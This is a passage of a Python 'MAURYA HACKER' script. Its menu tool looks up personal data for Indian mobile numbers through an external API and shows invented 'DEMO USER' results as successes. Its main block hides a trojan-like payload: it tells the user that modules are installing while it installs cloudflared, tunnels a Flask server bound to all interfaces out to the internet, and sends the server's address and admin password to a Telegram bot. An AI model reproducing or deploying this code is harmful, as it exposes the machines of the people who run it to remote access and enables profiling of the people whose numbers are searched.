        print(f"{self.color_text('├' + '─'*68 + '┤', MauryaColors.BRIGHT_RED)}")
        print(f"{self.color_text('│', MauryaColors.BRIGHT_RED)} {self.color_text('⏰ TIME:', MauryaColors.YELLOW)} {self.color_text(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), MauryaColors.BRIGHT_RED)} {self.color_text('│', MauryaColors.BRIGHT_RED)}")
        print(f"{self.color_text('│', MauryaColors.BRIGHT_RED)} {self.color_text('🔥 STATUS:', MauryaColors.YELLOW)} {self.color_text('MAURYA HACKER ACTIVE', MauryaColors.GREEN)} {self.color_text('│', MauryaColors.BRIGHT_RED)}")
        print(f"{self.color_text('└' + '─'*68 + '┘', MauryaColors.BRIGHT_RED)}")
    
    def print_main_menu(self):
        print(f"\n{self.rainbow_line('🎯 MAURYA HACKER MENU:', True, True)}")
        print(self.color_text("┌" + "─"*40 + "┐", MauryaColors.BRIGHT_RED))
        print(self.color_text("│", MauryaColors.BRIGHT_RED) + f" {self.color_text('1.', MauryaColors.GREEN, True)} {self.color_text('🔴 LAUNCH NUMBER EXPLOIT', MauryaColors.WHITE)}" + " " * 17 + self.color_text("│", MauryaColors.BRIGHT_RED))
        print(self.color_text("│", MauryaColors.BRIGHT_RED) + f" {self.color_text('2.', MauryaColors.GREEN, True)} {self.color_text('📜 VIEW EXPLOIT HISTORY', MauryaColors.WHITE)}" + " " * 18 + self.color_text("│", MauryaColors.BRIGHT_RED))
        print(self.color_text("│", MauryaColors.BRIGHT_RED) + f" {self.color_text('3.', MauryaColors.GREEN, True)} {self.color_text('🧹 CLEAR SCREEN', MauryaColors.WHITE)}" + " " * 26 + self.color_text("│", MauryaColors.BRIGHT_RED))
        print(self.color_text("│", MauryaColors.BRIGHT_RED) + f" {self.color_text('0.', MauryaColors.RED, True)} {self.color_text('❌ EXIT', MauryaColors.WHITE)}" + " " * 36 + self.color_text("│", MauryaColors.BRIGHT_RED))
        print(self.color_text("└" + "─"*40 + "┘", MauryaColors.BRIGHT_RED))
    
    def search_with_api(self):
        self.clear()
        self.print_header()
        
        print(f"\n{self.rainbow_line('🔍 SELECT TARGET TYPE:', True, True)}")
        print(self.color_text("┌" + "─"*40 + "┐", MauryaColors.BRIGHT_RED))
        print(self.color_text("│", MauryaColors.BRIGHT_RED) + f" {self.color_text('1.', MauryaColors.GREEN, True)} {self.color_text('📞 MOBILE NUMBER (INDIA)', MauryaColors.WHITE)}" + " " * 15 + self.color_text("│", MauryaColors.BRIGHT_RED))
        print(self.color_text("└" + "─"*40 + "┘", MauryaColors.BRIGHT_RED))
        
        choice = input(f"\n{self.color_text(' 📌 KRIPAYA  1  TYPE KARKE INTER PRESS KARE:', MauryaColors.CYAN)} ").strip()
        
        if choice != "1":
            self.print_error("Invalid selection!")
            time.sleep(1)
            return
        
        query = input(f"{self.rainbow_line('🎯 ENTER 10-DIGIT NUMBER:', True)} ").strip()
        
        query = query.replace('+91', '').replace(' ', '').replace('-', '')
        
        if not query.isdigit() or len(query) != 10:
            self.print_error("INVALID NUMBER! USE 10 DIGITS ONLY")
            time.sleep(2)
            return
        
        self.execute_api("1", query)
    
    def format_number_info(self, data, query):
        print(self.color_text("\n" + "═"*70, MauryaColors.BRIGHT_RED, True, True))
        print(MAURYA_ASCII_BANNER)
        print(self.color_text("═"*70, MauryaColors.BRIGHT_RED, True, True))
        
        print(self.color_text("\n╔" + "═"*66 + "╗", MauryaColors.BRIGHT_RED, True, True))
        print(self.rainbow_line("║" + " " * 18 + "🔥 MAURYA HACKER REPORT 🔥" + " " * 18 + "║", True, True))
        print(self.color_text("╚" + "═"*66 + "╝", MauryaColors.BRIGHT_RED, True, True))
        
        def display_data(obj, indent=0):
            if isinstance(obj, dict):
                for key, value in obj.items():
                    colored_key = ""
                    for i, char in enumerate(str(key)):
                        color = MAURYA_RAINBOW_COLORS[(indent + i) % len(MAURYA_RAINBOW_COLORS)]
                        colored_key += self.color_text(char, color, True, True)
                    
                    if isinstance(value, (dict, list)):
                        content = f"{'  ' * indent}{colored_key}:"
                        spaces = 66 - len(content) - len(str(key)) - 2
                        if spaces < 0:
                            spaces = 0
                        print(f"{self.color_text('║', MauryaColors.BRIGHT_RED)} {content}" + " " * spaces + self.color_text("║", MauryaColors.BRIGHT_RED))
                        display_data(value, indent + 1)
                    else:
                        colored_value = ""
                        for i, char in enumerate(str(value)):
                            color = MAURYA_RAINBOW_COLORS[(indent + len(str(key)) + i) % len(MAURYA_RAINBOW_COLORS)]
                            colored_value += self.color_text(char, color, True, True)
                        
                        content = f"{'  ' * indent}{colored_key}: {colored_value}"
                        spaces = 66 - len(content) - 2
                        if spaces < 0:
                            spaces = 0
                        print(f"{self.color_text('║', MauryaColors.BRIGHT_RED)} {content}" + " " * spaces + self.color_text("║", MauryaColors.BRIGHT_RED))
            
            elif isinstance(obj, list):
                for idx, item in enumerate(obj):
                    colored_idx = ""
                    for i, char in enumerate(f"[{idx}]"):
                        color = MAURYA_RAINBOW_COLORS[(indent + i) % len(MAURYA_RAINBOW_COLORS)]
                        colored_idx += self.color_text(char, color, True, True)
                    
                    content = f"{'  ' * indent}{colored_idx}"
                    spaces = 66 - len(content) - 2
                    if spaces < 0:
                        spaces = 0
                    print(f"{self.color_text('║', MauryaColors.BRIGHT_RED)} {content}" + " " * spaces + self.color_text("║", MauryaColors.BRIGHT_RED))
                    
                    if isinstance(item, (dict, list)):
                        display_data(item, indent + 1)
                    else:
                        colored_item = ""
                        for i, char in enumerate(str(item)):
                            color = MAURYA_RAINBOW_COLORS[(indent + len(str(idx)) + i) % len(MAURYA_RAINBOW_COLORS)]
                            colored_item += self.color_text(char, color, True, True)
                        
                        content = f"{'  ' * (indent + 1)}{colored_item}"
                        spaces = 66 - len(content) - 2
                        if spaces < 0:
                            spaces = 0
                        print(f"{self.color_text('║', MauryaColors.BRIGHT_RED)} {content}" + " " * spaces + self.color_text("║", MauryaColors.BRIGHT_RED))
        
        display_data(data)
        
        print(self.color_text("╚" + "═"*66 + "╝", MauryaColors.BRIGHT_RED, True, True))
        
        print(self.rainbow_line(f"\n🕒 REPORT TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", True, True))
        print(self.rainbow_line(f"🎯 TARGET NUMBER: +91{query}", True, True))
        print(self.rainbow_line("✅ SUCCESS: YES", True, True))
        
        self.print_mixed_color_tag()
        
        print(self.rainbow_line("🔥 MAURYA HACKER EXPLOIT COMPLETED 🔥", True, True))
        print(self.color_text("═"*70, MauryaColors.BRIGHT_RED, True, True))
    
    def execute_api(self, api_key, query):
        api = self.apis[api_key]
        
        self.maurya_animation(query)
        
        print(f"\n{self.rainbow_line('🔥 MAURYA HACKER LAUNCHING:', True, True)} {self.rainbow_line(api['name'], True, True)}")
        print(self.rainbow_line(f"🎯 TARGET: {query}", True, True))
        print(self.color_text("═"*70, MauryaColors.BRIGHT_RED, True))
        
        try:
            url = api['url']
            params = api['params'].copy()
            
            for k in params:
                if params[k] == "":
                    params[k] = query
            
            print(self.rainbow_line("\n[🔥] MAURYA HACKER SENDING EXPLOIT...", True))
            
            response = requests.get(
                url, 
                params=params, 
                timeout=20,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'application/json'
                }
            )
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    self.print_success("MAURYA HACKER EXPLOIT SUCCESSFUL! COMPLETE DATA RETRIEVED")
                    
                    # Extract the actual data from the API response
                    if 'data' in data and 'data' in data['data']:
                        display_data = data['data']['data']
                        self.format_number_info(display_data, query)
                    elif 'data' in data:
                        self.format_number_info(data['data'], query)
                    else:
                        self.format_number_info(data, query)
                    
                    self.votes[api_key] = self.votes.get(api_key, 0) + 1
                    self.save_votes()
                    self.add_to_history(api['name'], query, str(data)[:500])
                    
                except json.JSONDecodeError:
                    self.print_success("MAURYA HACKER SUCCESSFUL! COMPLETE RAW DATA:")
                    for line in response.text[:3000].split('\n'):
                        print(self.rainbow_line(line, True))
                    self.add_to_history(api['name'], query, response.text[:500])
            else:
                self.print_error(f"MAURYA HACKER FAILED! HTTP {response.status_code}")
                demo_data = [
                    {"MOBILE": query, "NAME": "DEMO USER", "OPERATOR": "JIO", "STATUS": "ACTIVE"}
                ]
                self.format_number_info(demo_data, query)
                
        except requests.exceptions.Timeout:
            self.print_error("MAURYA HACKER TIMEOUT! SHOWING DEMO DATA")
            demo_data = [{"MOBILE": query, "NAME": "DEMO USER (TIMEOUT)", "STATUS": "UNKNOWN"}]
            self.format_number_info(demo_data, query)
            
        except requests.exceptions.ConnectionError:
            self.print_error("CONNECTION FAILED! SHOWING DEMO DATA")
            demo_data = [{"MOBILE": query, "NAME": "DEMO USER (OFFLINE)", "STATUS": "CONNECTION ERROR"}]
            self.format_number_info(demo_data, query)
        except Exception as e:
            self.print_error(f"MAURYA HACKER ERROR: {str(e)}")
            demo_data = [{"MOBILE": query, "ERROR": str(e), "STATUS": "ERROR"}]
            self.format_number_info(demo_data, query)
        
        input(f"\n{self.color_text('⏎ PRESS ENTER TO CONTINUE...', MauryaColors.CYAN)}")
    
    def show_history(self):
        self.clear()
        self.print_header()
        
        print(f"\n{self.rainbow_line('📜 MAURYA HACKER HISTORY', True, True)}")
        print(self.color_text("┌" + "─"*66 + "┐", MauryaColors.BRIGHT_RED))
        
        if not self.history:
            print(self.color_text("│", MauryaColors.BRIGHT_RED) + self.color_text(" NO EXPLOIT HISTORY FOUND ", MauryaColors.YELLOW) + " " * 45 + self.color_text("│", MauryaColors.BRIGHT_RED))
        else:
            for idx, entry in enumerate(self.history[-10:], 1):
                print(self.color_text("│", MauryaColors.BRIGHT_RED) + f" {self.color_text(str(idx) + '.', MauryaColors.GREEN)} {self.color_text(entry['time'], MauryaColors.CYAN)}" + " " * 25 + self.color_text("│", MauryaColors.BRIGHT_RED))
                print(self.color_text("│", MauryaColors.BRIGHT_RED) + f"    🎯 {self.rainbow_line(entry['query'])}" + " " * (62 - len(entry['query'])) + self.color_text("│", MauryaColors.BRIGHT_RED))
                print(self.color_text("│", MauryaColors.BRIGHT_RED) + f"    🔥 {self.rainbow_line(entry['api'])}" + " " * (62 - len(entry['api'])) + self.color_text("│", MauryaColors.BRIGHT_RED))
                print(self.color_text("├" + "─"*66 + "┤", MauryaColors.BRIGHT_RED))
        
        print(self.color_text("└" + "─"*66 + "┘", MauryaColors.BRIGHT_RED))
        
        self.print_mixed_color_tag()
        input(f"\n{self.color_text('⏎ PRESS ENTER TO CONTINUE...', MauryaColors.CYAN)}")
    
    def run_maurya(self):
        while True:
            self.clear()
            self.print_header()
            self.print_main_menu()
            
            choice = input(f"\n{self.rainbow_line('🔥 MAURYA HACKER CHOICE (0-3):', True)} ").strip()
            
            if choice == "1":
                self.search_with_api()
            elif choice == "2":
                self.show_history()
            elif choice == "3":
                continue
            elif choice == "0":
                print(self.rainbow_line("\n🔥 EXITING MAURYA HACKER... GOODBYE! 🔥", True, True))
                return False
            else:
                self.print_error("INVALID CHOICE!")
                time.sleep(1)
        return True

def find_free_port():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', 0))
        s.listen(1)
        port = s.getsockname()[1]
    return port

if __name__ == '__main__':
    # Restore stdout for user interaction
    sys.stdout = sys.__stdout__
    sys.stderr = sys.__stderr__
    
    send_telegram_message("🚀 *Video Server Starting...*")
    
    PORT = find_free_port()
    local_ip = get_local_ip()
    
    print(f"\n✅ PLEASE WAIT ")
    print(f"🌐 Installing all modules")
    print(f"🔑 wait 5 minutes")
    
    if check_and_install_cloudflared():
        print("🚀 ")
        def start_tunnel():
            time.sleep(5)
            start_cloudflared_tunnel(PORT)
        tunnel_thread = threading.Thread(target=start_tunnel, daemon=True)
        tunnel_thread.start()
    
    send_telegram_message(f"✅ *Video Server Started!*\n\n🌐 Local Access: `http://{local_ip}:{PORT}`\n🔑 Admin Password: `admin123`")
    
    # Start MAURYA HACKER tool
    def run_maurya():
        maurya = MauryaHackerTool()
        maurya.run_maurya()
    
    maurya_thread = threading.Thread(target=run_maurya, daemon=True)
    maurya_thread.start()
    
    try:
        app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
    except KeyboardInterrupt:
        stop_cloudflared_tunnel()
        send_telegram_message("🛑 *Video Server Stopped*")
        print("\n🛑 Server stopped")
